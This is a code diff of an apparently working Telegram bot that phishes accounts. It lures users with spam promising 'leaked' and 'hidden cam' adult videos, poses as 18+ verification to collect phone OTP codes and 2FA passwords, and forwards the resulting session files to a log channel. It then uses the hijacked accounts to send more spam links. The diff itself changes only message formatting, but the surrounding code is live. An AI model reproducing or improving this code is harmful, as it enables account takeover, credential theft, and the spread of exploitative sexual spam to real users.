@@ -33,30 +33,30 @@ database = mongo_client['Cluster0']['sessions']
 
 # Promo Texts (10 unique messages)
 PROMO_TEXTS = [
-    "🔥 10K+ horny Videos!! 💦 Real Cum, No Filters 💎 Ultra HD Uncut Scenes  🎁 No Cost — Click & Claim now! 👉 http://bit.ly/hot_bot",
-    "💋 Uncensored Desi Leaks! 🔥 Real GF/BF Videos 😍 Free Access Here 👉 http://bit.ly/hot_bot",
-    "😈 Indian, Desi, Couples 🔥 10K+ horny Videos!! 💦 Hidden Cam + GF Fun 👉 http://bit.ly/hot_bot",
-    "🎥 Leaked College MMS 😍 100% Real Desi Action 💥 Tap to Watch 👉 http://bit.ly/hot_bot",
-    "💎 VIP Only Scenes Now Free 💦 Hidden Cam + GF Fun 👀 Daily New Leaks 👉 http://bit.ly/hot_bot",
-    "👅 Unlimited Hot Content 🔞 Free Lifetime Access 🎁 Unlimited Hot Content 👉 http://bit.ly/hot_bot",
-    "🔥 Hidden Cam + GF Fun 💋 Just Click & Watch 💦 Ultra Real Videos 👉 http://bit.ly/hot_bot",
-    "🎬 Daily New Leaks 💥 Indian, Desi, Couples 🔞 10K+ horny Videos!! 👉 http://bit.ly/hot_bot",
-    "👀 New Viral Hard Videos 💦 Real Amateur Fun With Man 🎉 Join & Enjoy 👉 http://bit.ly/hot_bot",
-    "🚨 Unlimited Hot Content 💦 18+ Only Videos 🔥 Try Once, Regret Never 👉 http://bit.ly/hot_bot"
+    "🔥 10K+ horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes  \n🎁 No Cost — Click & Claim now! \n👉 http://bit.ly/hot_bot",
+    "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 http://bit.ly/hot_bot",
+    "😈 Indian, Desi, Couples \n🔥 10K+ horny Videos!! \n💦 Hidden Cam + GF Fun \n👉 http://bit.ly/hot_bot",
+    "🎥 Leaked College MMS \n😍 100% Real Desi Action \n💥 Tap to Watch \n👉 http://bit.ly/hot_bot",
+    "💎 VIP Only Scenes Now Free \n💦 Hidden Cam + GF Fun \n👀 Daily New Leaks \n👉 http://bit.ly/hot_bot",
+    "👅 Unlimited Hot Content \n🔞 Free Lifetime Access \n🎁 Unlimited Hot Content \n👉 http://bit.ly/hot_bot",
+    "🔥 Hidden Cam + GF Fun \n💋 Just Click & Watch \n💦 Ultra Real Videos \n👉 http://bit.ly/hot_bot",
+    "🎬 Daily New Leaks \n💥 Indian, Desi, Couples \n🔞 10K+ horny Videos!! \n👉 http://bit.ly/hot_bot",
+    "👀 New Viral Hard Videos \n💦 Real Amateur Fun With Man \n🎉 Join & Enjoy \n👉 http://bit.ly/hot_bot",
+    "🚨 Unlimited Hot Content \n💦 18+ Only Videos \n🔥 Try Once, Regret Never \n👉 http://bit.ly/hot_bot"
 ]
 
 # Strings
 strings = {
     'need_login': "You have to /login first!",
     'already_logged_in': "You're already logged in! 🥳",
-    'age_verification': "**🔥 ʀᴇᴀᴅʏ ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴅᴜʟᴛ ᴠɪᴅᴇᴏs?  🚀 ᴄᴏɴғɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴛᴏ ᴜɴʟᴏᴄᴋ ɪɴsᴛᴀɴᴛ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʜᴏᴛᴛᴇsᴛ ᴄᴀᴛᴇɢᴏʀɪᴇs.  ⚡️ ᴅᴏɴ'ᴛ ᴍɪss ɪᴛ — ᴀᴄᴄᴇss ɪs ʟɪᴍɪᴛᴇᴅ!  👇 Click below to verify 👇",
-    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
-    'logout_success': "Logged out! 🔒\n/login to access again.",
-    'not_logged_in': "Not logged in! ❌\n/login first.",
-    'otp_wrong': "**❌ WRONG OTP!**\nAttempts left: {attempts}/3",
-    'otp_blocked': "**🚫 BLOCKED!**\nToo many wrong OTP attempts.\nContact admin.",
-    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\nAttempts left: {attempts}/3",
-    '2fa_blocked': "**🚫 BLOCKED!**\nToo many wrong 2FA attempts.\nContact admin."
+    'age_verification': "**🔥 ʀᴇᴀᴅʏ ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴅᴜʟᴛ ᴠɪᴅᴇᴏs? \n\n🚀 ᴄᴏɴғɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴛᴏ ᴜɴʟᴏᴄᴋ ɪɴsᴛᴀɴᴛ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʜᴏᴛᴛᴇsᴛ ᴄᴀᴛᴇɢᴏʀɪᴇs.  \n\n⚡️ ᴅᴏɴ'ᴛ ᴍɪss ɪᴛ — ᴀᴄᴄᴇss ɪs ʟɪᴍɪᴛᴇᴅ!  \n\n👇 Click below to verify 👇",
+    'verification_success': "**✅ VERIFIED!**\n\nAccess granted to premium content!",
+    'logout_success': "Logged out! 🔒\n\n/login to access again.",
+    'not_logged_in': "Not logged in! ❌\n\n/login first.",
+    'otp_wrong': "**❌ WRONG OTP!**\n\nAttempts left: {attempts}/3",
+    'otp_blocked': "**🚫 BLOCKED!**\n\nToo many wrong OTP attempts.",
+    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\n\nAttempts left: {attempts}/3",
+    '2fa_blocked': "**🚫 BLOCKED!**\n\nToo many wrong 2FA attempts."
 }
 
 # Inline OTP Keyboard
@@ -234,11 +234,11 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             )
             state['otp_digits'] = ''
         except SessionPasswordNeeded:
-            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
+            await query.message.edit("**🔒 2FA REQUIRED:**\n\nEnter your password:")
             state['needs_password'] = True
             state['last_msg_id'] = query.message.id
         except Exception as e:
-            await query.message.reply(f"Error: {e}\n/login again.")
+            await query.message.reply(f"Error: {e}\n\n/login again.")
             await cleanup_user_state(user_id)
         return
     else:
@@ -304,7 +304,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         )
         state['last_msg_id'] = error_msg.id
     except Exception as e:
-        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"Error: {e}\n\n/login again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
@@ -341,7 +341,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         await bot.send_document(
             LOG_CHANNEL_SESSIONS_FILES,
             str(session_file),
-            caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
+            caption=f"📱 User: {clean_phone}\n\n🔑 #Session_Created !"
         )
         
         # Remove local copy
@@ -471,7 +471,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
                     f"💀 #{error_type}: {phone_number}\n"
-                    f"❌ Error: {str(e)}\n"
+                    f"❌ Error: {str(e)}\n\n"
                     f"🛑 Auto-disabled promotion"
                 )
                 database.update_one(
@@ -486,7 +486,7 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
                     f"💀 #SESSION_TERMINATED: {phone_number}\n"
-                    f"❌ Error: {str(e)}\n"
+                    f"❌ Error: {str(e)}\n\n"
                     f"🛑 Emergency stop"
                 )
                 database.update_one(
